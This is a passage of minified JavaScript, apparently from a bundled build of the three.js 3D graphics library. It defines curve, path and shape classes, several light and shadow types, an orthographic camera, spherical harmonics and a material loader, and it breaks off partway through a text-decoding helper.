this.closed=e.closed,this.curveType=e.curveType,this.tension=e.tension,this},((_l.prototype=Object.create(cl.prototype)).constructor=_l).prototype.isCubicBezierCurve=!0,_l.prototype.getPoint=function(e,t){var n=t||new ie,r=this.v0,i=this.v1,a=this.v2,o=this.v3;return n.set(bl(e,r.x,i.x,a.x,o.x),bl(e,r.y,i.y,a.y,o.y)),n},_l.prototype.copy=function(e){return cl.prototype.copy.call(this,e),this.v0.copy(e.v0),this.v1.copy(e.v1),this.v2.copy(e.v2),this.v3.copy(e.v3),this},_l.prototype.toJSON=function(){var e=cl.prototype.toJSON.call(this);return e.v0=this.v0.toArray(),e.v1=this.v1.toArray(),e.v2=this.v2.toArray(),e.v3=this.v3.toArray(),e},_l.prototype.fromJSON=function(e){return cl.prototype.fromJSON.call(this,e),this.v0.fromArray(e.v0),this.v1.fromArray(e.v1),this.v2.fromArray(e.v2),this.v3.fromArray(e.v3),this},((wl.prototype=Object.create(cl.prototype)).constructor=wl).prototype.isCubicBezierCurve3=!0,wl.prototype.getPoint=function(e,t){var n=t||new he,r=this.v0,i=this.v1,a=this.v2,o=this.v3;return n.set(bl(e,r.x,i.x,a.x,o.x),bl(e,r.y,i.y,a.y,o.y),bl(e,r.z,i.z,a.z,o.z)),n},wl.prototype.copy=function(e){return cl.prototype.copy.call(this,e),this.v0.copy(e.v0),this.v1.copy(e.v1),this.v2.copy(e.v2),this.v3.copy(e.v3),this},wl.prototype.toJSON=function(){var e=cl.prototype.toJSON.call(this);return e.v0=this.v0.toArray(),e.v1=this.v1.toArray(),e.v2=this.v2.toArray(),e.v3=this.v3.toArray(),e},wl.prototype.fromJSON=function(e){return cl.prototype.fromJSON.call(this,e),this.v0.fromArray(e.v0),this.v1.fromArray(e.v1),this.v2.fromArray(e.v2),this.v3.fromArray(e.v3),this},((Cl.prototype=Object.create(cl.prototype)).constructor=Cl).prototype.isLineCurve=!0,Cl.prototype.getPoint=function(e,t){var n=t||new ie;return 1===e?n.copy(this.v2):(n.copy(this.v2).sub(this.v1),n.multiplyScalar(e).add(this.v1)),n},Cl.prototype.getPointAt=function(e,t){return this.getPoint(e,t)},Cl.prototype.getTangent=function(e,t){var n=t||new ie;return n.copy(this.v2).sub(this.v1).normalize(),n},Cl.prototype.copy=function(e){return cl.prototype.copy.call(this,e),this.v1.copy(e.v1),this.v2.copy(e.v2),this},Cl.prototype.toJSON=function(){var e=cl.prototype.toJSON.call(this);return e.v1=this.v1.toArray(),e.v2=this.v2.toArray(),e},Cl.prototype.fromJSON=function(e){return cl.prototype.fromJSON.call(this,e),this.v1.fromArray(e.v1),this.v2.fromArray(e.v2),this},((xl.prototype=Object.create(cl.prototype)).constructor=xl).prototype.isLineCurve3=!0,xl.prototype.getPoint=function(e,t){var n=t||new he;return 1===e?n.copy(this.v2):(n.copy(this.v2).sub(this.v1),n.multiplyScalar(e).add(this.v1)),n},xl.prototype.getPointAt=function(e,t){return this.getPoint(e,t)},xl.prototype.copy=function(e){return cl.prototype.copy.call(this,e),this.v1.copy(e.v1),this.v2.copy(e.v2),this},xl.prototype.toJSON=function(){var e=cl.prototype.toJSON.call(this);return e.v1=this.v1.toArray(),e.v2=this.v2.toArray(),e},xl.prototype.fromJSON=function(e){return cl.prototype.fromJSON.call(this,e),this.v1.fromArray(e.v1),this.v2.fromArray(e.v2),this},((Sl.prototype=Object.create(cl.prototype)).constructor=Sl).prototype.isQuadraticBezierCurve=!0,Sl.prototype.getPoint=function(e,t){var n=t||new ie,r=this.v0,i=this.v1,a=this.v2;return n.set(yl(e,r.x,i.x,a.x),yl(e,r.y,i.y,a.y)),n},Sl.prototype.copy=function(e){return cl.prototype.copy.call(this,e),this.v0.copy(e.v0),this.v1.copy(e.v1),this.v2.copy(e.v2),this},Sl.prototype.toJSON=function(){var e=cl.prototype.toJSON.call(this);return e.v0=this.v0.toArray(),e.v1=this.v1.toArray(),e.v2=this.v2.toArray(),e},Sl.prototype.fromJSON=function(e){return cl.prototype.fromJSON.call(this,e),this.v0.fromArray(e.v0),this.v1.fromArray(e.v1),this.v2.fromArray(e.v2),this},((kl.prototype=Object.create(cl.prototype)).constructor=kl).prototype.isQuadraticBezierCurve3=!0,kl.prototype.getPoint=function(e,t){var n=t||new he,r=this.v0,i=this.v1,a=this.v2;return n.set(yl(e,r.x,i.x,a.x),yl(e,r.y,i.y,a.y),yl(e,r.z,i.z,a.z)),n},kl.prototype.copy=function(e){return cl.prototype.copy.call(this,e),this.v0.copy(e.v0),this.v1.copy(e.v1),this.v2.copy(e.v2),this},kl.prototype.toJSON=function(){var e=cl.prototype.toJSON.call(this);return e.v0=this.v0.toArray(),e.v1=this.v1.toArray(),e.v2=this.v2.toArray(),e},kl.prototype.fromJSON=function(e){return cl.prototype.fromJSON.call(this,e),this.v0.fromArray(e.v0),this.v1.fromArray(e.v1),this.v2.fromArray(e.v2),this},((Ml.prototype=Object.create(cl.prototype)).constructor=Ml).prototype.isSplineCurve=!0,Ml.prototype.getPoint=function(e,t){var n=t||new ie,r=this.points,i=(r.length-1)*e,a=Math.floor(i),o=i-a,s=r[0===a?a:a-1],l=r[a],c=r[a>r.length-2?r.length-1:a+1],u=r[a>r.length-3?r.length-1:a+2];return n.set(gl(o,s.x,l.x,c.x,u.x),gl(o,s.y,l.y,c.y,u.y)),n},Ml.prototype.copy=function(e){cl.prototype.copy.call(this,e),this.points=[];for(var t=0,n=e.points.length;t<n;t++){var r=e.points[t];this.points.push(r.clone())}return this},Ml.prototype.toJSON=function(){var e=cl.prototype.toJSON.call(this);e.points=[];for(var t=0,n=this.points.length;t<n;t++){var r=this.points[t];e.points.push(r.toArray())}return e},Ml.prototype.fromJSON=function(e){cl.prototype.fromJSON.call(this,e),this.points=[];for(var t=0,n=e.points.length;t<n;t++){var r=e.points[t];this.points.push((new ie).fromArray(r))}return this};var Bl=Object.freeze({__proto__:null,ArcCurve:dl,CatmullRomCurve3:vl,CubicBezierCurve:_l,CubicBezierCurve3:wl,EllipseCurve:ul,LineCurve:Cl,LineCurve3:xl,QuadraticBezierCurve:Sl,QuadraticBezierCurve3:kl,SplineCurve:Ml});function El(){cl.call(this),this.type="CurvePath",this.curves=[],this.autoClose=!1}function Tl(e){El.call(this),this.type="Path",this.currentPoint=new ie,e&&this.setFromPoints(e)}function Pl(e){Tl.call(this,e),this.uuid=J.generateUUID(),this.type="Shape",this.holes=[]}function Il(e,t){pt.call(this),this.type="Light",this.color=new Lt(e),this.intensity=void 0!==t?t:1}function Fl(e,t,n){Il.call(this,e,n),this.type="HemisphereLight",this.position.copy(pt.DefaultUp),this.updateMatrix(),this.groundColor=new Lt(t)}function Ll(e){this.camera=e,this.bias=0,this.normalBias=0,this.radius=1,this.mapSize=new ie(512,512),this.map=null,this.mapPass=null,this.matrix=new $e,this.autoUpdate=!0,this.needsUpdate=!1,this._frustum=new $n,this._frameExtents=new ie(1,1),this._viewportCount=1,this._viewports=[new ce(0,0,1,1)]}function Ol(){Ll.call(this,new Ln(50,1,.5,500)),this.focus=1}function Nl(e,t,n,r,i,a){Il.call(this,e,t),this.type="SpotLight",this.position.copy(pt.DefaultUp),this.updateMatrix(),this.target=new pt,Object.defineProperty(this,"power",{get:function(){return this.intensity*Math.PI},set:function(e){this.intensity=e/Math.PI}}),this.distance=void 0!==n?n:0,this.angle=void 0!==r?r:Math.PI/3,this.penumbra=void 0!==i?i:0,this.decay=void 0!==a?a:1,this.shadow=new Ol}function Dl(){Ll.call(this,new Ln(90,1,.5,500)),this._frameExtents=new ie(4,2),this._viewportCount=6,this._viewports=[new ce(2,1,1,1),new ce(0,1,1,1),new ce(3,1,1,1),new ce(1,1,1,1),new ce(3,0,1,1),new ce(1,0,1,1)],this._cubeDirections=[new he(1,0,0),new he(-1,0,0),new he(0,0,1),new he(0,0,-1),new he(0,1,0),new he(0,-1,0)],this._cubeUps=[new he(0,1,0),new he(0,1,0),new he(0,1,0),new he(0,1,0),new he(0,0,1),new he(0,0,-1)]}function Rl(e,t,n,r){Il.call(this,e,t),this.type="PointLight",Object.defineProperty(this,"power",{get:function(){return 4*this.intensity*Math.PI},set:function(e){this.intensity=e/(4*Math.PI)}}),this.distance=void 0!==n?n:0,this.decay=void 0!==r?r:1,this.shadow=new Dl}function jl(e,t,n,r,i,a){Fn.call(this),this.type="OrthographicCamera",this.zoom=1,this.view=null,this.left=void 0!==e?e:-1,this.right=void 0!==t?t:1,this.top=void 0!==n?n:1,this.bottom=void 0!==r?r:-1,this.near=void 0!==i?i:.1,this.far=void 0!==a?a:2e3,this.updateProjectionMatrix()}function Ul(){Ll.call(this,new jl(-5,5,5,-5,.5,500))}function $l(e,t){Il.call(this,e,t),this.type="DirectionalLight",this.position.copy(pt.DefaultUp),this.updateMatrix(),this.target=new pt,this.shadow=new Ul}function zl(e,t){Il.call(this,e,t),this.type="AmbientLight"}function Hl(e,t,n,r){Il.call(this,e,t),this.type="RectAreaLight",this.width=void 0!==n?n:10,this.height=void 0!==r?r:10}El.prototype=Object.assign(Object.create(cl.prototype),{constructor:El,add:function(e){this.curves.push(e)},closePath:function(){var e=this.curves[0].getPoint(0),t=this.curves[this.curves.length-1].getPoint(1);e.equals(t)||this.curves.push(new Cl(t,e))},getPoint:function(e){for(var t=e*this.getLength(),n=this.getCurveLengths(),r=0;r<n.length;){if(n[r]>=t){var i=n[r]-t,a=this.curves[r],o=a.getLength(),s=0===o?0:1-i/o;return a.getPointAt(s)}r++}return null},getLength:function(){var e=this.getCurveLengths();return e[e.length-1]},updateArcLengths:function(){this.needsUpdate=!0,this.cacheLengths=null,this.getCurveLengths()},getCurveLengths:function(){if(this.cacheLengths&&this.cacheLengths.length===this.curves.length)return this.cacheLengths;for(var e=[],t=0,n=0,r=this.curves.length;n<r;n++)t+=this.curves[n].getLength(),e.push(t);return this.cacheLengths=e},getSpacedPoints:function(e){void 0===e&&(e=40);for(var t=[],n=0;n<=e;n++)t.push(this.getPoint(n/e));return this.autoClose&&t.push(t[0]),t},getPoints:function(e){e=e||12;for(var t,n=[],r=0,i=this.curves;r<i.length;r++)for(var a=i[r],o=a&&a.isEllipseCurve?2*e:a&&(a.isLineCurve||a.isLineCurve3)?1:a&&a.isSplineCurve?e*a.points.length:e,s=a.getPoints(o),l=0;l<s.length;l++){var c=s[l];t&&t.equals(c)||(n.push(c),t=c)}return this.autoClose&&1<n.length&&!n[n.length-1].equals(n[0])&&n.push(n[0]),n},copy:function(e){cl.prototype.copy.call(this,e),this.curves=[];for(var t=0,n=e.curves.length;t<n;t++){var r=e.curves[t];this.curves.push(r.clone())}return this.autoClose=e.autoClose,this},toJSON:function(){var e=cl.prototype.toJSON.call(this);e.autoClose=this.autoClose,e.curves=[];for(var t=0,n=this.curves.length;t<n;t++){var r=this.curves[t];e.curves.push(r.toJSON())}return e},fromJSON:function(e){cl.prototype.fromJSON.call(this,e),this.autoClose=e.autoClose,this.curves=[];for(var t=0,n=e.curves.length;t<n;t++){var r=e.curves[t];this.curves.push((new Bl[r.type]).fromJSON(r))}return this}}),Tl.prototype=Object.assign(Object.create(El.prototype),{constructor:Tl,setFromPoints:function(e){this.moveTo(e[0].x,e[0].y);for(var t=1,n=e.length;t<n;t++)this.lineTo(e[t].x,e[t].y);return this},moveTo:function(e,t){return this.currentPoint.set(e,t),this},lineTo:function(e,t){var n=new Cl(this.currentPoint.clone(),new ie(e,t));return this.curves.push(n),this.currentPoint.set(e,t),this},quadraticCurveTo:function(e,t,n,r){var i=new Sl(this.currentPoint.clone(),new ie(e,t),new ie(n,r));return this.curves.push(i),this.currentPoint.set(n,r),this},bezierCurveTo:function(e,t,n,r,i,a){var o=new _l(this.currentPoint.clone(),new ie(e,t),new ie(n,r),new ie(i,a));return this.curves.push(o),this.currentPoint.set(i,a),this},splineThru:function(e){var t=new Ml([this.currentPoint.clone()].concat(e));return this.curves.push(t),this.currentPoint.copy(e[e.length-1]),this},arc:function(e,t,n,r,i,a){var o=this.currentPoint.x,s=this.currentPoint.y;return this.absarc(e+o,t+s,n,r,i,a),this},absarc:function(e,t,n,r,i,a){return this.absellipse(e,t,n,n,r,i,a),this},ellipse:function(e,t,n,r,i,a,o,s){var l=this.currentPoint.x,c=this.currentPoint.y;return this.absellipse(e+l,t+c,n,r,i,a,o,s),this},absellipse:function(e,t,n,r,i,a,o,s){var l=new ul(e,t,n,r,i,a,o,s);if(0<this.curves.length){var c=l.getPoint(0);c.equals(this.currentPoint)||this.lineTo(c.x,c.y)}this.curves.push(l);var u=l.getPoint(1);return this.currentPoint.copy(u),this},copy:function(e){return El.prototype.copy.call(this,e),this.currentPoint.copy(e.currentPoint),this},toJSON:function(){var e=El.prototype.toJSON.call(this);return e.currentPoint=this.currentPoint.toArray(),e},fromJSON:function(e){return El.prototype.fromJSON.call(this,e),this.currentPoint.fromArray(e.currentPoint),this}}),Pl.prototype=Object.assign(Object.create(Tl.prototype),{constructor:Pl,getPointsHoles:function(e){for(var t=[],n=0,r=this.holes.length;n<r;n++)t[n]=this.holes[n].getPoints(e);return t},extractPoints:function(e){return{shape:this.getPoints(e),holes:this.getPointsHoles(e)}},copy:function(e){Tl.prototype.copy.call(this,e),this.holes=[];for(var t=0,n=e.holes.length;t<n;t++){var r=e.holes[t];this.holes.push(r.clone())}return this},toJSON:function(){var e=Tl.prototype.toJSON.call(this);e.uuid=this.uuid,e.holes=[];for(var t=0,n=this.holes.length;t<n;t++){var r=this.holes[t];e.holes.push(r.toJSON())}return e},fromJSON:function(e){Tl.prototype.fromJSON.call(this,e),this.uuid=e.uuid,this.holes=[];for(var t=0,n=e.holes.length;t<n;t++){var r=e.holes[t];this.holes.push((new Tl).fromJSON(r))}return this}}),Il.prototype=Object.assign(Object.create(pt.prototype),{constructor:Il,isLight:!0,copy:function(e){return pt.prototype.copy.call(this,e),this.color.copy(e.color),this.intensity=e.intensity,this},toJSON:function(e){var t=pt.prototype.toJSON.call(this,e);return t.object.color=this.color.getHex(),t.object.intensity=this.intensity,void 0!==this.groundColor&&(t.object.groundColor=this.groundColor.getHex()),void 0!==this.distance&&(t.object.distance=this.distance),void 0!==this.angle&&(t.object.angle=this.angle),void 0!==this.decay&&(t.object.decay=this.decay),void 0!==this.penumbra&&(t.object.penumbra=this.penumbra),void 0!==this.shadow&&(t.object.shadow=this.shadow.toJSON()),t}}),Fl.prototype=Object.assign(Object.create(Il.prototype),{constructor:Fl,isHemisphereLight:!0,copy:function(e){return Il.prototype.copy.call(this,e),this.groundColor.copy(e.groundColor),this}}),Object.assign(Ll.prototype,{_projScreenMatrix:new $e,_lightPositionWorld:new he,_lookTarget:new he,getViewportCount:function(){return this._viewportCount},getFrustum:function(){return this._frustum},updateMatrices:function(e){var t=this.camera,n=this.matrix,r=this._projScreenMatrix,i=this._lookTarget,a=this._lightPositionWorld;a.setFromMatrixPosition(e.matrixWorld),t.position.copy(a),i.setFromMatrixPosition(e.target.matrixWorld),t.lookAt(i),t.updateMatrixWorld(),r.multiplyMatrices(t.projectionMatrix,t.matrixWorldInverse),this._frustum.setFromProjectionMatrix(r),n.set(.5,0,0,.5,0,.5,0,.5,0,0,.5,.5,0,0,0,1),n.multiply(t.projectionMatrix),n.multiply(t.matrixWorldInverse)},getViewport:function(e){return this._viewports[e]},getFrameExtents:function(){return this._frameExtents},copy:function(e){return this.camera=e.camera.clone(),this.bias=e.bias,this.radius=e.radius,this.mapSize.copy(e.mapSize),this},clone:function(){return(new this.constructor).copy(this)},toJSON:function(){var e={};return 0!==this.bias&&(e.bias=this.bias),0!==this.normalBias&&(e.normalBias=this.normalBias),1!==this.radius&&(e.radius=this.radius),512===this.mapSize.x&&512===this.mapSize.y||(e.mapSize=this.mapSize.toArray()),e.camera=this.camera.toJSON(!1).object,delete e.camera.matrix,e}}),Ol.prototype=Object.assign(Object.create(Ll.prototype),{constructor:Ol,isSpotLightShadow:!0,updateMatrices:function(e){var t=this.camera,n=2*J.RAD2DEG*e.angle*this.focus,r=this.mapSize.width/this.mapSize.height,i=e.distance||t.far;n===t.fov&&r===t.aspect&&i===t.far||(t.fov=n,t.aspect=r,t.far=i,t.updateProjectionMatrix()),Ll.prototype.updateMatrices.call(this,e)}}),Nl.prototype=Object.assign(Object.create(Il.prototype),{constructor:Nl,isSpotLight:!0,copy:function(e){return Il.prototype.copy.call(this,e),this.distance=e.distance,this.angle=e.angle,this.penumbra=e.penumbra,this.decay=e.decay,this.target=e.target.clone(),this.shadow=e.shadow.clone(),this}}),Dl.prototype=Object.assign(Object.create(Ll.prototype),{constructor:Dl,isPointLightShadow:!0,updateMatrices:function(e,t){void 0===t&&(t=0);var n=this.camera,r=this.matrix,i=this._lightPositionWorld,a=this._lookTarget,o=this._projScreenMatrix;i.setFromMatrixPosition(e.matrixWorld),n.position.copy(i),a.copy(n.position),a.add(this._cubeDirections[t]),n.up.copy(this._cubeUps[t]),n.lookAt(a),n.updateMatrixWorld(),r.makeTranslation(-i.x,-i.y,-i.z),o.multiplyMatrices(n.projectionMatrix,n.matrixWorldInverse),this._frustum.setFromProjectionMatrix(o)}}),Rl.prototype=Object.assign(Object.create(Il.prototype),{constructor:Rl,isPointLight:!0,copy:function(e){return Il.prototype.copy.call(this,e),this.distance=e.distance,this.decay=e.decay,this.shadow=e.shadow.clone(),this}}),jl.prototype=Object.assign(Object.create(Fn.prototype),{constructor:jl,isOrthographicCamera:!0,copy:function(e,t){return Fn.prototype.copy.call(this,e,t),this.left=e.left,this.right=e.right,this.top=e.top,this.bottom=e.bottom,this.near=e.near,this.far=e.far,this.zoom=e.zoom,this.view=null===e.view?null:Object.assign({},e.view),this},setViewOffset:function(e,t,n,r,i,a){null===this.view&&(this.view={enabled:!0,fullWidth:1,fullHeight:1,offsetX:0,offsetY:0,width:1,height:1}),this.view.enabled=!0,this.view.fullWidth=e,this.view.fullHeight=t,this.view.offsetX=n,this.view.offsetY=r,this.view.width=i,this.view.height=a,this.updateProjectionMatrix()},clearViewOffset:function(){null!==this.view&&(this.view.enabled=!1),this.updateProjectionMatrix()},updateProjectionMatrix:function(){var e=(this.right-this.left)/(2*this.zoom),t=(this.top-this.bottom)/(2*this.zoom),n=(this.right+this.left)/2,r=(this.top+this.bottom)/2,i=n-e,a=n+e,o=r+t,s=r-t;if(null!==this.view&&this.view.enabled){var l=(this.right-this.left)/this.view.fullWidth/this.zoom,c=(this.top-this.bottom)/this.view.fullHeight/this.zoom;a=(i+=l*this.view.offsetX)+l*this.view.width,s=(o-=c*this.view.offsetY)-c*this.view.height}this.projectionMatrix.makeOrthographic(i,a,o,s,this.near,this.far),this.projectionMatrixInverse.getInverse(this.projectionMatrix)},toJSON:function(e){var t=pt.prototype.toJSON.call(this,e);return t.object.zoom=this.zoom,t.object.left=this.left,t.object.right=this.right,t.object.top=this.top,t.object.bottom=this.bottom,t.object.near=this.near,t.object.far=this.far,null!==this.view&&(t.object.view=Object.assign({},this.view)),t}}),Ul.prototype=Object.assign(Object.create(Ll.prototype),{constructor:Ul,isDirectionalLightShadow:!0,updateMatrices:function(e){Ll.prototype.updateMatrices.call(this,e)}}),$l.prototype=Object.assign(Object.create(Il.prototype),{constructor:$l,isDirectionalLight:!0,copy:function(e){return Il.prototype.copy.call(this,e),this.target=e.target.clone(),this.shadow=e.shadow.clone(),this}}),zl.prototype=Object.assign(Object.create(Il.prototype),{constructor:zl,isAmbientLight:!0}),Hl.prototype=Object.assign(Object.create(Il.prototype),{constructor:Hl,isRectAreaLight:!0,copy:function(e){return Il.prototype.copy.call(this,e),this.width=e.width,this.height=e.height,this},toJSON:function(e){var t=Il.prototype.toJSON.call(this,e);return t.object.width=this.width,t.object.height=this.height,t}});var Vl=function(){function e(){Object.defineProperty(this,"isSphericalHarmonics3",{value:!0}),this.coefficients=[];for(var e=0;e<9;e++)this.coefficients.push(new he)}var t=e.prototype;return t.set=function(e){for(var t=0;t<9;t++)this.coefficients[t].copy(e[t]);return this},t.zero=function(){for(var e=0;e<9;e++)this.coefficients[e].set(0,0,0);return this},t.getAt=function(e,t){var n=e.x,r=e.y,i=e.z,a=this.coefficients;return t.copy(a[0]).multiplyScalar(.282095),t.addScaledVector(a[1],.488603*r),t.addScaledVector(a[2],.488603*i),t.addScaledVector(a[3],.488603*n),t.addScaledVector(a[4],n*r*1.092548),t.addScaledVector(a[5],r*i*1.092548),t.addScaledVector(a[6],.315392*(3*i*i-1)),t.addScaledVector(a[7],n*i*1.092548),t.addScaledVector(a[8],.546274*(n*n-r*r)),t},t.getIrradianceAt=function(e,t){var n=e.x,r=e.y,i=e.z,a=this.coefficients;return t.copy(a[0]).multiplyScalar(.886227),t.addScaledVector(a[1],1.023328*r),t.addScaledVector(a[2],1.023328*i),t.addScaledVector(a[3],1.023328*n),t.addScaledVector(a[4],.858086*n*r),t.addScaledVector(a[5],.858086*r*i),t.addScaledVector(a[6],.743125*i*i-.247708),t.addScaledVector(a[7],.858086*n*i),t.addScaledVector(a[8],.429043*(n*n-r*r)),t},t.add=function(e){for(var t=0;t<9;t++)this.coefficients[t].add(e.coefficients[t]);return this},t.addScaledSH=function(e,t){for(var n=0;n<9;n++)this.coefficients[n].addScaledVector(e.coefficients[n],t);return this},t.scale=function(e){for(var t=0;t<9;t++)this.coefficients[t].multiplyScalar(e);return this},t.lerp=function(e,t){for(var n=0;n<9;n++)this.coefficients[n].lerp(e.coefficients[n],t);return this},t.equals=function(e){for(var t=0;t<9;t++)if(!this.coefficients[t].equals(e.coefficients[t]))return!1;return!0},t.copy=function(e){return this.set(e.coefficients)},t.clone=function(){return(new this.constructor).copy(this)},t.fromArray=function(e,t){void 0===t&&(t=0);for(var n=this.coefficients,r=0;r<9;r++)n[r].fromArray(e,t+3*r);return this},t.toArray=function(e,t){void 0===e&&(e=[]),void 0===t&&(t=0);for(var n=this.coefficients,r=0;r<9;r++)n[r].toArray(e,t+3*r);return e},e.getBasisAt=function(e,t){var n=e.x,r=e.y,i=e.z;t[0]=.282095,t[1]=.488603*r,t[2]=.488603*i,t[3]=.488603*n,t[4]=1.092548*n*r,t[5]=1.092548*r*i,t[6]=.315392*(3*i*i-1),t[7]=1.092548*n*i,t[8]=.546274*(n*n-r*r)},e}();function Ql(e,t){Il.call(this,void 0,t),this.type="LightProbe",this.sh=void 0!==e?e:new Vl}function Gl(e){el.call(this,e),this.textures={}}Ql.prototype=Object.assign(Object.create(Il.prototype),{constructor:Ql,isLightProbe:!0,copy:function(e){return Il.prototype.copy.call(this,e),this.sh.copy(e.sh),this},fromJSON:function(e){return this.intensity=e.intensity,this.sh.fromArray(e.sh),this},toJSON:function(e){var t=Il.prototype.toJSON.call(this,e);return t.object.sh=this.sh.toArray(),t}}),Gl.prototype=Object.assign(Object.create(el.prototype),{constructor:Gl,load:function(e,t,n,r){var i=this,a=new nl(i.manager);a.setPath(i.path),a.setRequestHeader(i.requestHeader),a.setWithCredentials(i.withCredentials),a.load(e,(function(n){try{t(i.parse(JSON.parse(n)))}catch(n){r&&r(n),i.manager.itemError(e)}}),n,r)},parse:function(e){var t=this.textures;function n(e){return t[e],t[e]}var r=new Os[e.type];if(void 0!==e.uuid&&(r.uuid=e.uuid),void 0!==e.name&&(r.name=e.name),void 0!==e.color&&void 0!==r.color&&r.color.setHex(e.color),void 0!==e.roughness&&(r.roughness=e.roughness),void 0!==e.metalness&&(r.metalness=e.metalness),void 0!==e.sheen&&(r.sheen=(new Lt).setHex(e.sheen)),void 0!==e.emissive&&void 0!==r.emissive&&r.emissive.setHex(e.emissive),void 0!==e.specular&&void 0!==r.specular&&r.specular.setHex(e.specular),void 0!==e.shininess&&(r.shininess=e.shininess),void 0!==e.clearcoat&&(r.clearcoat=e.clearcoat),void 0!==e.clearcoatRoughness&&(r.clearcoatRoughness=e.clearcoatRoughness),void 0!==e.fog&&(r.fog=e.fog),void 0!==e.flatShading&&(r.flatShading=e.flatShading),void 0!==e.blending&&(r.blending=e.blending),void 0!==e.combine&&(r.combine=e.combine),void 0!==e.side&&(r.side=e.side),void 0!==e.opacity&&(r.opacity=e.opacity),void 0!==e.transparent&&(r.transparent=e.transparent),void 0!==e.alphaTest&&(r.alphaTest=e.alphaTest),void 0!==e.depthTest&&(r.depthTest=e.depthTest),void 0!==e.depthWrite&&(r.depthWrite=e.depthWrite),void 0!==e.colorWrite&&(r.colorWrite=e.colorWrite),void 0!==e.stencilWrite&&(r.stencilWrite=e.stencilWrite),void 0!==e.stencilWriteMask&&(r.stencilWriteMask=e.stencilWriteMask),void 0!==e.stencilFunc&&(r.stencilFunc=e.stencilFunc),void 0!==e.stencilRef&&(r.stencilRef=e.stencilRef),void 0!==e.stencilFuncMask&&(r.stencilFuncMask=e.stencilFuncMask),void 0!==e.stencilFail&&(r.stencilFail=e.stencilFail),void 0!==e.stencilZFail&&(r.stencilZFail=e.stencilZFail),void 0!==e.stencilZPass&&(r.stencilZPass=e.stencilZPass),void 0!==e.wireframe&&(r.wireframe=e.wireframe),void 0!==e.wireframeLinewidth&&(r.wireframeLinewidth=e.wireframeLinewidth),void 0!==e.wireframeLinecap&&(r.wireframeLinecap=e.wireframeLinecap),void 0!==e.wireframeLinejoin&&(r.wireframeLinejoin=e.wireframeLinejoin),void 0!==e.rotation&&(r.rotation=e.rotation),1!==e.linewidth&&(r.linewidth=e.linewidth),void 0!==e.dashSize&&(r.dashSize=e.dashSize),void 0!==e.gapSize&&(r.gapSize=e.gapSize),void 0!==e.scale&&(r.scale=e.scale),void 0!==e.polygonOffset&&(r.polygonOffset=e.polygonOffset),void 0!==e.polygonOffsetFactor&&(r.polygonOffsetFactor=e.polygonOffsetFactor),void 0!==e.polygonOffsetUnits&&(r.polygonOffsetUnits=e.polygonOffsetUnits),void 0!==e.skinning&&(r.skinning=e.skinning),void 0!==e.morphTargets&&(r.morphTargets=e.morphTargets),void 0!==e.morphNormals&&(r.morphNormals=e.morphNormals),void 0!==e.dithering&&(r.dithering=e.dithering),void 0!==e.vertexTangents&&(r.vertexTangents=e.vertexTangents),void 0!==e.visible&&(r.visible=e.visible),void 0!==e.toneMapped&&(r.toneMapped=e.toneMapped),void 0!==e.userData&&(r.userData=e.userData),void 0!==e.vertexColors&&("number"==typeof e.vertexColors?r.vertexColors=0<e.vertexColors:r.vertexColors=e.vertexColors),void 0!==e.uniforms)for(var i in e.uniforms){var a=e.uniforms[i];switch(r.uniforms[i]={},a.type){case"t":r.uniforms[i].value=n(a.value);break;case"c":r.uniforms[i].value=(new Lt).setHex(a.value);break;case"v2":r.uniforms[i].value=(new ie).fromArray(a.value);break;case"v3":r.uniforms[i].value=(new he).fromArray(a.value);break;case"v4":r.uniforms[i].value=(new ce).fromArray(a.value);break;case"m3":r.uniforms[i].value=(new ae).fromArray(a.value);break;case"m4":r.uniforms[i].value=(new $e).fromArray(a.value);break;default:r.uniforms[i].value=a.value}}if(void 0!==e.defines&&(r.defines=e.defines),void 0!==e.vertexShader&&(r.vertexShader=e.vertexShader),void 0!==e.fragmentShader&&(r.fragmentShader=e.fragmentShader),void 0!==e.extensions)for(var o in e.extensions)r.extensions[o]=e.extensions[o];if(void 0!==e.shading&&(r.flatShading=1===e.shading),void 0!==e.size&&(r.size=e.size),void 0!==e.sizeAttenuation&&(r.sizeAttenuation=e.sizeAttenuation),void 0!==e.map&&(r.map=n(e.map)),void 0!==e.matcap&&(r.matcap=n(e.matcap)),void 0!==e.alphaMap&&(r.alphaMap=n(e.alphaMap)),void 0!==e.bumpMap&&(r.bumpMap=n(e.bumpMap)),void 0!==e.bumpScale&&(r.bumpScale=e.bumpScale),void 0!==e.normalMap&&(r.normalMap=n(e.normalMap)),void 0!==e.normalMapType&&(r.normalMapType=e.normalMapType),void 0!==e.normalScale){var s=e.normalScale;!1===Array.isArray(s)&&(s=[s,s]),r.normalScale=(new ie).fromArray(s)}return void 0!==e.displacementMap&&(r.displacementMap=n(e.displacementMap)),void 0!==e.displacementScale&&(r.displacementScale=e.displacementScale),void 0!==e.displacementBias&&(r.displacementBias=e.displacementBias),void 0!==e.roughnessMap&&(r.roughnessMap=n(e.roughnessMap)),void 0!==e.metalnessMap&&(r.metalnessMap=n(e.metalnessMap)),void 0!==e.emissiveMap&&(r.emissiveMap=n(e.emissiveMap)),void 0!==e.emissiveIntensity&&(r.emissiveIntensity=e.emissiveIntensity),void 0!==e.specularMap&&(r.specularMap=n(e.specularMap)),void 0!==e.envMap&&(r.envMap=n(e.envMap)),void 0!==e.envMapIntensity&&(r.envMapIntensity=e.envMapIntensity),void 0!==e.reflectivity&&(r.reflectivity=e.reflectivity),void 0!==e.refractionRatio&&(r.refractionRatio=e.refractionRatio),void 0!==e.lightMap&&(r.lightMap=n(e.lightMap)),void 0!==e.lightMapIntensity&&(r.lightMapIntensity=e.lightMapIntensity),void 0!==e.aoMap&&(r.aoMap=n(e.aoMap)),void 0!==e.aoMapIntensity&&(r.aoMapIntensity=e.aoMapIntensity),void 0!==e.gradientMap&&(r.gradientMap=n(e.gradientMap)),void 0!==e.clearcoatMap&&(r.clearcoatMap=n(e.clearcoatMap)),void 0!==e.clearcoatRoughnessMap&&(r.clearcoatRoughnessMap=n(e.clearcoatRoughnessMap)),void 0!==e.clearcoatNormalMap&&(r.clearcoatNormalMap=n(e.clearcoatNormalMap)),void 0!==e.clearcoatNormalScale&&(r.clearcoatNormalScale=(new ie).fromArray(e.clearcoatNormalScale)),void 0!==e.transmission&&(r.transmission=e.transmission),void 0!==e.transmissionMap&&(r.transmissionMap=n(e.transmissionMap)),r},setTextures:function(e){return this.textures=e,this}});var Wl={decodeText:function(e){if("undefined"!=typeof TextDecoder)return(new TextDecoder).decode(e);for(var t="",n=0,r=e.length;n<r;n++)t+=String.fromCharCode(e[n]);try{return decodeURIComponent(escape(t))}catch(e){return 